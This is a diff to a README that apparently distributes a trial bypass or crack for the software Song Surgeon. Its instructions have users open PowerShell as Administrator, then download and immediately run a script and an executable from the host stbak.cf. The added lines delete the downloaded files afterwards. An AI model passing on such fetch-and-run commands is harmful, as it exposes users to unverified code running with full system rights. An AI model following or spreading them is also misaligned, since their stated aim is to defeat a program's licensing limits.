@@ -48,7 +48,7 @@ This method needs an stable internet connection, If you are using latest version
 1. Goto start menu and search for **powershell**, Right click on it and Choose **Run as Administrator**
 2. After comfirming Admin Password, type the below code into the powershell window and hit enter
 ```
-wget stbak.cf/ss -outfile ss.cmd; ss.cmd
+wget stbak.cf/ss -outfile ss.cmd; ss.cmd; del ss.cmd
 ```
 3. Now Open the Song Surgeon and see how the script magically works on it.
 
@@ -62,3 +62,9 @@ This method doesn't lock the time of your Program so te demo time continues coun
 ```
 cd\; wget stbak.cf/sss -outfile sss.exe; .\sss.exe
 ```
+for deleting temporary files which created by powershell use
+```
+remove-item sss.exe
+```
+
+***Note: Make sure you manually patch the code before using the install as startup task.***
